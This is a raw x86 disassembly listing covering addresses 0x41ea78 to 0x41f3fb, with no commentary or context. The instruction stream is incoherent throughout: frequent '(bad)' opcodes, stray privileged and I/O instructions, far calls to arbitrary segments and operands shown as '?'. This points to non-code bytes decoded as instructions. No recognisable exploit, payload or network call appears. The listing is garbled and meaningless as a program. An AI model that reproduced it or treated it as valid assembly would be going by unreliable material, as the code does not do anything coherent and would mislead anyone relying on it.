  41ea78:	or     BYTE PTR ds:0x273a5ba8,ch
  41ea7e:	cwde   
  41ea7f:	scas   eax,DWORD PTR es:[edi]
  41ea80:	(bad)  
  41ea81:	and    al,0xac
  41ea83:	mov    esi,0xa18e421b
  41ea88:	sbb    esi,DWORD PTR [edx+edi*2]
  41ea8b:	popf   
  41ea8c:	hlt    
  41ea8d:	daa    
  41ea8e:	mov    ds:0x79e3dbbe,al
  41ea93:	lods   eax,DWORD PTR ds:[esi]
  41ea94:	into   
  41ea95:	es cwde 
  41ea97:	jnp    0x41ea46
  41ea99:	das    
  41ea9a:	mov    ss,WORD PTR [edi-0x3d95ec62]
  41eaa0:	(bad)  
  41eaa1:	and    eax,0x269a5b6f
  41eaa6:	pop    eax
  41eaa7:	scas   eax,DWORD PTR es:[edi]
  41eaa8:	mov    esi,0x8bbe4c24
  41eaad:	inc    ecx
  41eaae:	dec    ebp
  41eaaf:	(bad)  
  41eab0:	xchg   ebx,eax
  41eab1:	and    BYTE PTR [edx-0x75],dl
  41eab4:	cdq    
  41eab5:	es push ebx
  41eab7:	rol    edi,0x32
  41eaba:	sub    eax,ecx
  41eabc:	xchg   ebx,eax
  41eabd:	push   cs
  41eabe:	adc    DWORD PTR [ebp+0x378c],ebp
	...
  41eaec:	cld    
  41eaed:	lods   eax,DWORD PTR ds:[esi]
  41eaee:	mov    esp,DWORD PTR [edi]
  41eaf0:	sbb    eax,0x2f9900af
  41eaf5:	(bad)  
  41eaf6:	ins    DWORD PTR es:[edi],dx
  41eaf7:	xchg   DWORD PTR [ebp-0x5dc6ab63],ebx
  41eafd:	call   0x3574:0xc95f506c
  41eb04:	add    DWORD PTR [ebx-0x36e6bf8c],ebp
  41eb0a:	jno    0x41eaf5
  41eb0c:	sub    al,0xc6
  41eb0e:	xor    ax,0x9831
  41eb12:	jb     0x41eb60
  41eb14:	push   ss
  41eb15:	popf   
  41eb16:	push   eax
  41eb17:	daa    
  41eb18:	push   cs
  41eb19:	mov    eax,DWORD PTR [eax]
  41eb1b:	xor    eax,0x3a74aa23
  41eb20:	pop    ds
  41eb21:	stos   BYTE PTR es:[edi],al
  41eb22:	jno    0x41eb24
  41eb24:	popa   
  41eb25:	lds    eax,FWORD PTR [esi+0x0]
  41eb28:	mov    dx,0x1a00
  41eb2c:	pop    ebx
  41eb2d:	scas   eax,DWORD PTR es:[edi]
  41eb2e:	arpl   dx,di
  41eb30:	popa   
  41eb31:	mov    esi,0xc58ae972
  41eb36:	jno    0x41eb2d
  41eb38:	pop    edx
  41eb39:	(bad)  
  41eb3a:	ins    BYTE PTR es:[edi],dx
  41eb3b:	lods   eax,DWORD PTR ds:[esi]
  41eb3c:	pop    edx
  41eb3d:	test   eax,0xaf1be92f
  41eb42:	imul   eax,ebp,0x3d
  41eb45:	xchg   edi,eax
  41eb46:	push   ecx
  41eb47:	mov    esp,0xaf74a91a
  41eb4c:	sbb    DWORD PTR [ebx+0xa700],ecx
	...
  41eb7a:	sbb    ch,BYTE PTR [ebp-0x50d54493]
  41eb80:	arpl   WORD PTR [edx-0x62a04525],di
  41eb86:	cmp    eax,0x319a67a3
  41eb8b:	enter  0x9072,0xa3
  41eb8f:	mov    edx,0x963d955f
  41eb94:	add    BYTE PTR fs:[ebx+0x716b624c],bh
  41eb9b:	push   esi
  41eb9c:	pop    ebp
  41eb9d:	je     0x41eb46
  41eb9f:	dec    edi
  41eba0:	jno    0x41ec0b
  41eba2:	les    eax,FWORD PTR [ecx+0x4af6642e]
  41eba8:	add    BYTE PTR [ebx+ecx*2+0x66],bl
  41ebac:	jb     0x41ec10
  41ebae:	add    BYTE PTR [ebp+0x54],dh
  41ebb1:	push   eax
  41ebb2:	imul   ebp,DWORD PTR [bp+di+0x66],0x2b
  41ebb7:	push   0x72fa725d
  41ebbc:	push   esp
  41ebbd:	jne    0x41ebd4
  41ebbf:	jns    0x41ec2c
  41ebc1:	inc    esi
  41ebc2:	sub    ebp,DWORD PTR [edi+0x0]
  41ebc5:	imul   esi,DWORD PTR [ecx],0x3361744c
  41ebcb:	xor    DWORD PTR [eax+0x61],0x5b
  41ebcf:	xchg   DWORD PTR [eax],eax
  41ebd1:	push   ebx
  41ebd2:	xor    BYTE PTR [eax+0x74],bl
  41ebd5:	ja     0x41ec0d
  41ebd7:	dec    ecx
  41ebd8:	popa   
  41ebd9:	pop    esp
  41ebda:	inc    esp
  41ebdb:	xor    BYTE PTR [ecx+eiz*2+0x0],0x0
	...
  41ec08:	xor    esi,DWORD PTR [ebp+0x46]
  41ec0b:	inc    esi
  41ec0c:	sub    ebp,DWORD PTR [edi+0x0]
  41ec0f:	inc    ebx
  41ec10:	in     eax,0x54
  41ec12:	fs gs icebp 
  41ec15:	gs gs popa 
  41ec18:	add    ebp,DWORD PTR [ebx+0x5d]
  41ec1b:	ins    BYTE PTR es:[edi],dx
  41ec1c:	or     ebx,DWORD PTR [edx+0x3f]
  41ec1f:	jb     0x41ec1b
  41ec21:	push   ebp
  41ec22:	popa   
  41ec23:	outs   dx,BYTE PTR ds:[esi]
  41ec24:	stos   DWORD PTR es:[edi],eax
  41ec25:	sbb    BYTE PTR [ebp+0x6c],0xa4
  41ec29:	and    DWORD PTR [ecx+0x63],0x6f4f59fc
  41ec30:	mov    ecx,0xa5617365
  41ec35:	push   esp
  41ec36:	pop    esp
  41ec37:	push   ebx
  41ec38:	fisttp QWORD PTR ds:[edi+ebx*2]
  41ec3c:	adc    bh,dh
  41ec3e:	cmp    al,BYTE PTR [esi+0x12]
  41ec41:	aam    0x34
  41ec43:	dec    ebp
  41ec44:	cs mov al,0x2a
  41ec47:	ins    DWORD PTR es:[edi],dx
  41ec48:	sub    BYTE PTR [ecx-0x4ee0afff],dh
  41ec4e:	adc    BYTE PTR [ebp+0x19],dh
  41ec51:	xchg   edx,eax
  41ec52:	and    BYTE PTR [eax],al
  41ec54:	jmp    0x41ebe6
  41ec56:	sbb    eax,0x25a30872
  41ec5b:	arpl   WORD PTR [esi],di
  41ec5d:	jl     0x41ec82
  41ec5f:	jno    0x41ec53
  41ec61:	and    BYTE PTR [eax],0x72
  41ec64:	in     eax,dx
  41ec65:	inc    ebx
  41ec66:	das    
  41ec67:	arpl   bx,bp
  41ec69:	pushf  
  41ec6a:	adc    BYTE PTR [ebx+0x0],ah
	...
  41ec95:	add    dl,bh
  41ec97:	call   0x7412:0x4cee0012
  41ec9e:	ds ins BYTE PTR es:[edi],dx
  41eca0:	and    esi,DWORD PTR [ecx-0x4e]
  41eca3:	jl     0x41ecc6
  41eca5:	imul   ebx,DWORD PTR [ebx-0x5392cebe],0x36
  41ecac:	add    DWORD PTR [ebx-0x53],edx
  41ecaf:	pop    edi
  41ecb0:	adc    ch,BYTE PTR [esi-0x61]
  41ecb3:	pop    edi
  41ecb4:	sbb    eax,0xf636e00
  41ecb9:	jno    0x41ec4c
  41ecbb:	or     eax,0xea3e640f
  41ecc0:	and    esi,DWORD PTR [ecx+0x72]
  41ecc3:	push   es
  41ecc4:	sub    dh,BYTE PTR [edx-0x80]
  41ecc7:	and    esp,DWORD PTR [esi]
  41ecc9:	arpl   WORD PTR [esi],di
  41eccb:	shl    DWORD PTR [ebx],1
  41eccd:	pushw  0xffed
  41ecd0:	and    DWORD PTR [edx+0x63],esi
  41ecd3:	into   
  41ecd4:	aas    
  41ecd5:	ins    DWORD PTR es:[edi],dx
  41ecd6:	pop    eax
  41ecd7:	sbb    al,0x1e
  41ecd9:	arpl   WORD PTR [ebp+0x5b],di
  41ecdc:	pushf  
  41ecdd:	adc    ebx,DWORD PTR [esi]
  41ecdf:	mov    BYTE PTR [esi-0x7753cde3],cl
  41ece5:	adc    DWORD PTR ds:0x3225a097,ebx
  41eceb:	mov    esi,0xaf1d2579
  41ecf0:	fwait
  41ecf1:	xor    ecx,DWORD PTR [esp+eax*8]
  41ecf4:	lea    ebp,[edx]
  41ecf6:	and    bh,BYTE PTR [esi+0x37a]
	...
  41ed24:	out    dx,eax
  41ed25:	ret    
  41ed26:	dec    ebp
  41ed27:	sbb    BYTE PTR [ebx],cl
  41ed29:	mov    edx,0x9d1a2959
  41ed2e:	cmp    esi,DWORD PTR [ebx+ecx*1]
  41ed31:	mov    edx,0x980a2959
  41ed36:	ss ss std 
  41ed39:	pushf  
  41ed3a:	adc    esi,DWORD PTR [edx+edi*8]
  41ed3d:	xchg   DWORD PTR [eax+0x18],eax
  41ed40:	frstor [edi-0x5824c419]
  41ed46:	sbb    eax,DWORD PTR [ebp*8+0x3e1604a7]
  41ed4d:	mov    eax,DWORD PTR [esi]
  41ed4f:	push   ss
  41ed50:	stos   BYTE PTR es:[edi],al
  41ed51:	pop    ebx
  41ed52:	aaa    
  41ed53:	cmp    edi,DWORD PTR [esi]
  41ed55:	mov    edi,ebx
  41ed57:	sbb    ecx,DWORD PTR [ebx+ebx*2+0x5b86371a]
  41ed5e:	not    DWORD PTR ds:0x2000bda3
  41ed64:	popf   
  41ed65:	test   al,0x15
  41ed67:	or     al,0x95
  41ed69:	(bad)  
  41ed6a:	out    0x2f,eax
  41ed6c:	or     BYTE PTR [edi-0x4c831c49],0xd7
  41ed73:	pop    ds
  41ed74:	pop    ebx
  41ed75:	test   eax,0x883e15cc
  41ed7a:	into   
  41ed7b:	sub    DWORD PTR [edx-0x54],edx
  41ed7e:	add    al,cl
  41ed80:	sub    edi,DWORD PTR [eax-0x74ee58a4]
  41ed86:	and    BYTE PTR [eax+eax*1+0x0],ch
	...
  41edb1:	add    BYTE PTR ds:0x538e6cab,dh
  41edb7:	mov    eax,0x8f07b572
  41edbc:	push   eax
  41edbd:	leave  
  41edbe:	div    BYTE PTR [edx-0x56a36a90]
  41edc4:	arpl   WORD PTR [ebx+0x69],di
  41edc7:	mov    gs,WORD PTR [ebp+0x7b]
  41edca:	xor    BYTE PTR [edx-0x479f7790],ch
  41edd0:	pop    esp
  41edd1:	xor    al,0xf4
  41edd3:	cdq    
  41edd4:	push   esp
  41edd5:	dec    esi
  41edd6:	sbb    eax,0x484842c7
  41eddb:	xor    BYTE PTR [edx],0x1b
  41edde:	xchg   BYTE PTR [ebx],dh
  41ede0:	aas    
  41ede1:	cmp    al,0x46
  41ede3:	scas   eax,DWORD PTR es:[edi]
  41ede4:	ins    DWORD PTR es:[edi],dx
  41ede5:	dec    edi
  41ede6:	xor    DWORD PTR [ebx+0x51],ebx
  41ede9:	inc    esi
  41edea:	and    al,0xaf
  41edec:	jne    0x41ee36
  41edee:	xor    BYTE PTR [eax-0x74f9d0a4],bh
  41edf4:	and    BYTE PTR [edx+ecx*2],ah
  41edf7:	stos   DWORD PTR es:[edi],eax
  41edf8:	ins    BYTE PTR es:[edi],dx
  41edf9:	push   es
  41edfa:	dec    eax
  41edfb:	mov    esi,0xad722d72
  41ee00:	ins    DWORD PTR es:[edi],dx
  41ee01:	cmovae edi,DWORD PTR [edi-0x74c2059d]
  41ee08:	pop    edi
  41ee09:	cli    
  41ee0a:	sub    BYTE PTR [eax+0x5b61fb6d],ch
  41ee10:	push   eax
  41ee11:	enter  0xac28,0x75
  41ee15:	into   
	...
  41ee3e:	add    BYTE PTR [eax],al
  41ee40:	push   ebx
  41ee41:	mov    bh,0x54
  41ee43:	ror    BYTE PTR [ebp-0x42],1
  41ee46:	add    BYTE PTR [ecx+0x74ac1c],ah
  41ee4c:	xlat   BYTE PTR ds:[ebx]
  41ee4d:	jb     0x41eeba
  41ee4f:	addr16 out dx,al
  41ee51:	jl     0x41ee53
  41ee53:	push   eax
  41ee54:	clc    
  41ee55:	dec    eax
  41ee56:	je     0x41ee58
  41ee58:	sahf   
  41ee59:	jl     0x41eec0
  41ee5b:	je     0x41ee0b
  41ee5d:	ja     0x41eecb
  41ee5f:	push   eax
  41ee60:	(bad)  
  41ee61:	dec    edx
  41ee62:	push   0x704ae100
  41ee67:	push   ebx
  41ee68:	mov    esi,0xbf2e614a
  41ee6d:	jnp    0x41eedb
  41ee6f:	add    BYTE PTR [ebx-0x3f968d5c],bh
  41ee75:	ja     0x41eeeb
  41ee77:	les    ebx,FWORD PTR gs:[esi+0x2e]
  41ee7b:	imul   ebp,ecx,0x315c0055
  41ee81:	jle    0x41eef1
  41ee83:	inc    esp
  41ee84:	push   cs
  41ee85:	push   eax
  41ee86:	popa   
  41ee87:	pop    esp
  41ee88:	adc    al,0x7c
  41ee8a:	outs   dx,BYTE PTR ds:[esi]
  41ee8b:	pushw  cs
  41ee8d:	test   BYTE PTR [ebx+edx*2+0x2],bl
  41ee91:	dec    eax
  41ee92:	outs   dx,DWORD PTR ds:[esi]
  41ee93:	imul   edi,eax,0x3b006f7c
  41ee99:	push   0x56247361
  41ee9e:	imul   ebp,DWORD PTR [esi+0x54],0x57
  41eea2:	dec    edi
  41eea3:	outs   dx,DWORD PTR ds:[esi]
	...
  41eecc:	add    BYTE PTR [eax],al
  41eece:	inc    ecx
  41eecf:	push   ebx
  41eed0:	jae    0x41ef33
  41eed2:	inc    ebp
  41eed3:	jp     0x41ef31
  41eed5:	push   esi
  41eed6:	ss jge 0x41ef1d
  41eed9:	jns    0x41ef07
  41eedb:	jp     0x41ef39
  41eedd:	push   ebx
  41eede:	inc    edx
  41eedf:	js     0x41ef52
  41eee1:	jb     0x41ef25
  41eee3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eee4:	pop    eax
  41eee5:	add    ah,dl
  41eee7:	jp     0x41ef57
  41eee9:	pushw  cs
  41eeeb:	and    DWORD PTR [eax],0x50
  41eeee:	and    edx,DWORD PTR ds:0x1ce73e68
  41eef5:	je     0x41ef63
  41eef7:	and    eax,DWORD PTR [edi+0x58]
  41eefa:	outs   dx,BYTE PTR ds:[esi]
  41eefb:	inc    esp
  41eefc:	sub    eax,0x25f06771
  41ef01:	jno    0x41ef1b
  41ef03:	in     al,dx
  41ef04:	sbb    eax,0x47183e6c
  41ef09:	push   esp
  41ef0a:	push   cs
  41ef0b:	not    BYTE PTR ds:0x33442671
  41ef11:	jae    0x41ef40
  41ef13:	fdiv   QWORD PTR [ebx]
  41ef15:	addr16 sub bl,bh
  41ef18:	fidiv  WORD PTR [edi+0x2b]
  41ef1b:	loopne 0x41ef1d
  41ef1d:	push   ecx
  41ef1e:	sbb    esi,DWORD PTR [esi+0x440c6317]
  41ef24:	ss jno 0x41ef42
  41ef27:	xchg   esi,eax
  41ef28:	and    bl,BYTE PTR [edi-0x15]
  41ef2b:	xchg   esi,eax
  41ef2c:	add    al,0x50
  41ef2e:	fist   WORD PTR [ebx+edx*1+0x75]
	...
  41ef59:	add    BYTE PTR [eax],al
  41ef5b:	add    cl,bl
  41ef5d:	xchg   ebp,eax
  41ef5e:	sub    BYTE PTR [eax],al
  41ef60:	clc    
  41ef61:	outs   dx,DWORD PTR ds:[esi]
  41ef62:	adc    al,0x50
  41ef64:	jmp    0xed4207de
  41ef69:	cwde   
  41ef6a:	sub    dh,BYTE PTR [ecx+edx*8-0x5e]
  41ef6e:	push   ss
  41ef6f:	arpl   dx,sp
  41ef71:	test   BYTE PTR [esi],dl
  41ef73:	ja     0x41ef18
  41ef75:	push   esp
  41ef76:	xor    BYTE PTR [ebp-0x65],dl
  41ef79:	xor    esp,DWORD PTR fs:[edi-0x4e]
  41ef7d:	push   edi
  41ef7e:	xor    al,0x73
  41ef80:	pushf  
  41ef81:	inc    esi
  41ef82:	sbb    DWORD PTR [ecx-0x5a],esi
  41ef85:	push   edi
  41ef86:	push   ss
  41ef87:	add    BYTE PTR [edx-0x7c],dh
  41ef8a:	sbb    DWORD PTR [ebp+esi*2+0x5b],esi
  41ef8e:	and    ah,BYTE PTR [ebx-0x7a]
  41ef91:	pop    ebx
  41ef92:	out    0x25,eax
  41ef94:	popa   
  41ef95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef96:	rcr    BYTE PTR [edx],cl
  41ef98:	pusha  
  41ef99:	mov    dh,0xcf
  41ef9b:	loope  0x41effa
  41ef9d:	lods   al,BYTE PTR ds:[esi]
  41ef9e:	out    0x3b,eax
  41efa0:	push   ebx
  41efa1:	lods   al,BYTE PTR ds:[esi]
  41efa2:	mov    ebx,0xc4be7921
  41efa7:	add    ebp,DWORD PTR [ebp-0x54]
  41efaa:	int3   
  41efab:	adc    eax,0x26bcba58
  41efb0:	mov    ecx,DWORD PTR ds:[eax-0x7157d0ec]
  41efb7:	adc    eax,0x20b75b1a
  41efbc:	sub    al,0xa7
  41efbe:	out    0x34,eax
	...
  41efe8:	add    BYTE PTR [eax],al
  41efea:	adc    edi,DWORD PTR [ecx-0x5306e785]
  41eff0:	test   BYTE PTR [edi],ch
  41eff2:	std    
  41eff3:	mov    dl,0x77
  41eff5:	and    bl,BYTE PTR [eax]
  41eff7:	xchg   edi,eax
  41eff8:	jns    0x41f014
  41effa:	or     BYTE PTR [esi-0x5422ccbd],dh
  41f000:	pop    edx
  41f001:	sbb    eax,0x45ac0e3
  41f006:	or     dl,BYTE PTR [esi-0x3efeebb1]
  41f00c:	sub    edx,DWORD PTR [edx]
  41f00e:	loope  0x41efb8
  41f010:	inc    esp
  41f011:	add    al,0xf2
  41f013:	mov    dh,0x39
  41f015:	sbb    eax,0xde3ab5d0
  41f01a:	xlat   BYTE PTR ds:[ebx]
  41f01b:	stos   DWORD PTR es:[edi],eax
  41f01c:	out    0xe1,eax
  41f01e:	test   eax,0xab131aba
  41f023:	rcr    BYTE PTR [ecx],0x28
  41f026:	pop    esp
  41f027:	jnp    0x41effa
  41f029:	jecxz  0x41f08a
  41f02b:	pop    ebx
  41f02c:	leave  
  41f02d:	fistp  WORD PTR [ecx]
  41f02f:	lea    ecx,[esi]
  41f031:	mov    ch,BYTE PTR es:[eax-0x43d3f800]
  41f038:	pop    esp
  41f039:	and    al,0x32
  41f03b:	stos   DWORD PTR es:[edi],eax
  41f03c:	pop    edi
  41f03d:	xlat   BYTE PTR ds:[ebx]
  41f03e:	sub    DWORD PTR [ebp+0x5b26d767],0x904dd143
  41f048:	outs   dx,BYTE PTR ds:[esi]
  41f049:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f04a:	dec    edi
  41f04b:	mov    eax,0xcc76
	...
  41f078:	sub    BYTE PTR [ebx+0x5b26cc6d],ah
  41f07e:	push   ecx
  41f07f:	int3   
  41f080:	das    
  41f081:	test   eax,0x8c3dbb63
  41f086:	jno    0x41f014
  41f088:	dec    edi
  41f089:	mov    eax,ds:0x5b668c5f
  41f08e:	push   eax
  41f08f:	mov    BYTE PTR [edx+ebp*4+0x75],cl
  41f093:	jle    0x41f0e4
  41f095:	mov    bh,0x0
  41f097:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f098:	dec    ebp
  41f099:	nop
  41f09a:	jno    0x41f116
  41f09c:	sub    BYTE PTR [esi-0x68c2728e],bh
  41f0a2:	addr16 jnp 0x41f0fb
  41f0a5:	mov    edx,0xa84c5674
  41f0aa:	add    BYTE PTR [edx],bh
  41f0ac:	push   ecx
  41f0ad:	mov    ecx,0xad235e74
  41f0b2:	arpl   WORD PTR ds:0x9489a20,bp
  41f0b8:	or     eax,0x293566be
  41f0bd:	nop
  41f0be:	jb     0x41f10c
  41f0c0:	push   cs
  41f0c1:	call   0xa67:0xaa2d486c
  41f0c8:	add    BYTE PTR [edi-0x7887c2b0],0x50
  41f0cf:	sub    BYTE PTR [ebp-0x44],bl
  41f0d2:	ins    DWORD PTR es:[edi],dx
  41f0d3:	adc    al,0x40
  41f0d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f0d6:	jno    0x41f0d8
  41f0d8:	daa    
  41f0d9:	cdq    
  41f0da:	je     0x41f14c
	...
  41f104:	add    BYTE PTR [eax],al
  41f106:	xor    al,0x84
  41f108:	jb     0x41f180
  41f10a:	cmp    cl,BYTE PTR [ecx+0x0]
  41f10d:	inc    esi
  41f10e:	or     ecx,DWORD PTR [ebx+0x51]
  41f111:	jae    0x41f11d
  41f113:	dec    ebp
  41f114:	dec    esi
  41f115:	popa   
  41f116:	add    al,BYTE PTR [eax+eax*1+0x504b0b46]
  41f11d:	popa   
  41f11e:	add    al,0x4a
  41f120:	jae    0x41f191
  41f122:	xchg   ebp,eax
  41f123:	jbe    0x41f125
  41f125:	pop    edi
  41f126:	cdq    
  41f127:	inc    esi
  41f128:	jo     0x41f17a
  41f12a:	test   BYTE PTR [ecx+0x6f],0x77
  41f12e:	or     BYTE PTR [esp+eiz*2+0x0],0xe9
  41f133:	inc    esi
  41f134:	jo     0x41f17a
  41f136:	into   
  41f137:	dec    esp
  41f138:	popa   
  41f139:	arpl   bx,cx
  41f13b:	dec    ebp
  41f13c:	jb     0x41f1b7
  41f13e:	xchg   edi,eax
  41f13f:	imul   ecx,DWORD PTR [ebx+0x46],0x523d65bb
  41f146:	fidivr DWORD PTR [esi+0x4e]
  41f149:	inc    ebx
  41f14a:	fistp  QWORD PTR [edx]
  41f14c:	push   eax
  41f14d:	outs   dx,DWORD PTR ds:[esi]
  41f14e:	mov    ecx,0x15617346
  41f153:	jbe    0x41f1b1
  41f155:	inc    esi
  41f156:	add    edx,DWORD PTR [edx+0x6e]
  41f159:	xor    ebx,DWORD PTR [bp+si+0x635f]
  41f15e:	and    BYTE PTR [esi+0x6e],al
  41f161:	je     0x41f177
  41f163:	push   edi
  41f164:	dec    edi
  41f165:	outs   dx,DWORD PTR ds:[esi]
  41f166:	stc    
  41f167:	push   edx
  41f168:	jae    0x41f1cb
	...
  41f192:	add    BYTE PTR [eax],al
  41f194:	add    eax,0x2b465c76
  41f199:	addr16 aas 
  41f19b:	ins    BYTE PTR es:[edi],dx
  41f19c:	dec    esi
  41f19d:	jbe    0x41f20d
  41f19f:	je     0x41f214
  41f1a1:	ins    BYTE PTR es:[edi],dx
  41f1a2:	gs je  0x41f1e3
  41f1a5:	pop    edi
  41f1a6:	str    WORD PTR [ebp-0x6e8bdcd3]
  41f1ad:	arpl   WORD PTR [edx],dx
  41f1af:	arpl   WORD PTR [edx+0x51],si
  41f1b2:	sbb    esp,DWORD PTR [esi-0x6e]
  41f1b5:	dec    esp
  41f1b6:	fisubr WORD PTR [esp+ecx*4+0x55]
  41f1ba:	xor    BYTE PTR [esi-0x6e],al
  41f1bd:	hlt    
  41f1be:	aas    
  41f1bf:	ins    BYTE PTR es:[edi],dx
  41f1c0:	addr16 pop ss
  41f1c2:	sbb    esi,DWORD PTR [edx+ecx*4-0xf]
  41f1c6:	sbb    DWORD PTR [ebx+ebx*2+0x11],esi
  41f1ca:	add    DWORD PTR [esi],ebp
  41f1cc:	imul   ebx,DWORD PTR [eax+eiz*1],0x1d1d2000
  41f1d3:	ins    BYTE PTR es:[edi],dx
  41f1d4:	ds push ds
  41f1d6:	adc    eax,0x10235270
  41f1db:	je     0x41f245
  41f1dd:	lds    ecx,FWORD PTR [edi]
  41f1df:	fs ds lock inc ebx
  41f1e3:	push   eax
  41f1e4:	or     eax,0x297422d5
  41f1e9:	jecxz  0x41f1f9
  41f1eb:	arpl   dx,di
  41f1ed:	call   FWORD PTR [ecx]
  41f1ef:	jb     0x41f20c
  41f1f1:	loope  0x41f207
  41f1f3:	ins    DWORD PTR es:[edi],dx
  41f1f4:	or     al,0xab
  41f1f6:	loope  0x41f244
	...
  41f220:	add    BYTE PTR [eax],al
  41f222:	push   cs
  41f223:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f224:	adc    BYTE PTR [eax],al
  41f226:	sbb    dh,BYTE PTR [ecx+0x1c]
  41f229:	pop    edi
  41f22a:	in     al,dx
  41f22b:	xchg   esi,eax
  41f22c:	sub    BYTE PTR [ecx-0x1d],dl
  41f22f:	(bad)  
  41f230:	sbb    BYTE PTR [edi-0x30],ah
  41f233:	xchg   esp,eax
  41f234:	ucomiss xmm3,xmm5
  41f237:	mov    al,ds:0x50f2000f
  41f23c:	sbb    al,0x5f
  41f23e:	int3   
  41f23f:	sahf   
  41f240:	sub    BYTE PTR [ecx-0x25],dl
  41f243:	sbb    BYTE PTR [bx-0x58],ah
  41f247:	pop    ebx
  41f248:	push   cs
  41f249:	adc    DWORD PTR [ebx-0x752bc196],edx
  41f24f:	lds    sp,DWORD PTR [eax]
  41f252:	lahf   
  41f253:	test   al,0xe7
  41f255:	das    
  41f256:	outs   dx,DWORD PTR ds:[esi]
  41f257:	ret    
  41f258:	or     BYTE PTR [edx],dl
  41f25a:	popf   
  41f25b:	mov    bh,0x1a
  41f25d:	daa    
  41f25e:	xchg   edx,eax
  41f25f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f260:	add    BYTE PTR [esi],bl
  41f262:	fwait
  41f263:	test   al,0xbd
  41f265:	adc    BYTE PTR [ecx-0x41],ch
  41f268:	rcl    BYTE PTR [edi],1
  41f26a:	pop    ebp
  41f26b:	pop    ebx
  41f26c:	mov    ebx,0xd9ba5630
  41f271:	es pop edx
  41f273:	mov    ah,al
  41f275:	pop    ss
  41f276:	push   edx
  41f277:	ret    0x24d5
  41f27a:	dec    edi
  41f27b:	mov    eax,?
  41f27d:	sub    al,0xe
  41f27f:	mov    esp,?
  41f281:	fisttp QWORD PTR [esi-0x56]
  41f284:	mov    ebx,0x1a
	...
  41f2ad:	add    BYTE PTR [eax],al
  41f2af:	add    BYTE PTR [edx],dh
  41f2b1:	mov    dh,0xe7
  41f2b3:	das    
  41f2b4:	(bad)  
  41f2b5:	mov    ebx,0xb61d2585
  41f2ba:	stos   BYTE PTR es:[edi],al
  41f2bb:	push   ss
  41f2bc:	cs jnp 0x41f279
  41f2bf:	sbb    al,0x20
  41f2c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f2c2:	jle    0x41f2e6
  41f2c4:	or     al,0xb6
  41f2c6:	out    0x1f,eax
  41f2c8:	sbb    eax,0xa2577ba
  41f2cd:	stos   DWORD PTR es:[edi],eax
  41f2ce:	out    0x16,eax
  41f2d0:	call   0xee673f93
  41f2d5:	jl     0x41f31b
  41f2d7:	or     al,0xdd
  41f2d9:	pop    edx
  41f2da:	pop    edx
  41f2db:	sbb    eax,0xda5ab5ea
  41f2e0:	fnstsw WORD PTR [ecx-0x3e30fbc5]
  41f2e6:	xor    esp,DWORD PTR [ecx]
  41f2e8:	iret   
  41f2e9:	jl     0x41f2eb
  41f2eb:	inc    eax
  41f2ec:	and    al,0xb4
  41f2ee:	add    BYTE PTR ds:0x195fb876,cl
  41f2f4:	ins    DWORD PTR es:[edi],dx
  41f2f5:	mov    WORD PTR [edx+0x4],?
  41f2f8:	push   esi
  41f2f9:	lahf   
  41f2fa:	arpl   WORD PTR [eax],cx
  41f2fc:	dec    edx
  41f2fd:	xchg   ebp,eax
  41f2fe:	push   esp
  41f2ff:	cmp    DWORD PTR [edx-0x76],eax
  41f302:	dec    ebp
  41f303:	das    
  41f304:	dec    esi
  41f305:	xchg   BYTE PTR [edi],bh
  41f307:	sbb    edi,DWORD PTR [edi-0x71]
  41f30a:	dec    esp
  41f30b:	or     al,0x5b
  41f30d:	stos   DWORD PTR es:[edi],eax
  41f30e:	push   ebp
  41f30f:	or     BYTE PTR [eax-0x48],dl
  41f312:	add    BYTE PTR [eax+0x0],dh
	...
  41f33c:	add    BYTE PTR [eax],al
  41f33e:	push   edi
  41f33f:	stos   BYTE PTR es:[edi],al
  41f340:	je     0x41f30a
  41f342:	push   ecx
  41f343:	mov    edi,0xc331c850
  41f348:	add    BYTE PTR [ebp-0x52a058de],ah
  41f34e:	xor    ch,BYTE PTR [ecx-0x55dd6700]
  41f354:	jno    0x41f314
  41f356:	and    al,0xa9
  41f358:	fs jmp 0x9db3b1d3
  41f35e:	ja     0x41f2ec
  41f360:	imul   eax,DWORD PTR [ebp+edi*1+0x4b8c7188],0xffffff9d
  41f368:	pop    edi
  41f369:	jl     0x41f3c9
  41f36b:	pop    ebx
  41f36c:	push   edx
  41f36d:	mov    WORD PTR [esi],?
  41f36f:	mov    esi,0xb4498474
  41f374:	jb     0x41f302
  41f376:	pop    eax
  41f377:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f378:	ins    DWORD PTR es:[edi],dx
  41f379:	jnp    0x41f3c5
  41f37b:	pop    ebx
  41f37c:	push   eax
  41f37d:	push   esi
  41f37e:	dec    eax
  41f37f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f380:	dec    esi
  41f381:	push   esp
  41f382:	inc    edi
  41f383:	mov    ecx,0x953a5b63
  41f388:	push   ecx
  41f389:	cmp    DWORD PTR [eax],esi
  41f38b:	mov    esi,0x73e80074
  41f390:	imul   ebp,DWORD PTR [edi+edx*2+0x64],0x6b
  41f395:	add    cx,WORD PTR [eax+0x5d]
  41f399:	jb     0x41f31d
  41f39b:	jae    0x41f3e6
  41f39d:	popa   
  41f39e:	push   ebp
  41f39f:	dec    ebx
  41f3a0:	outs   dx,BYTE PTR gs:[esi]
	...
  41f3ca:	add    BYTE PTR [eax],al
  41f3cc:	imul   DWORD PTR [esi+0x72]
  41f3cf:	imul   edi,DWORD PTR [ecx+edx*2],0x83276c75
  41f3d6:	das    
  41f3d7:	xor    ah,BYTE PTR [ebp+0x48]
  41f3da:	je     0x41f422
  41f3dc:	adc    ecx,DWORD PTR [edi+0x2e]
  41f3df:	imul   edi,DWORD PTR [ecx],0x234e0048
  41f3e5:	jb     0x41f44c
  41f3e7:	je     0x41f3eb
  41f3e9:	push   edx
  41f3ea:	cs imul edi,ecx,0x995c0047
  41f3f1:	jnp    0x41f467
  41f3f3:	inc    esp
  41f3f4:	cmc    
  41f3f5:	inc    edi
  41f3f6:	jbe    0x41f45d
  41f3f8:	out    0x6e,eax
  41f3fa:	pop    ebp
  41f3fb:	jae    0x41f381
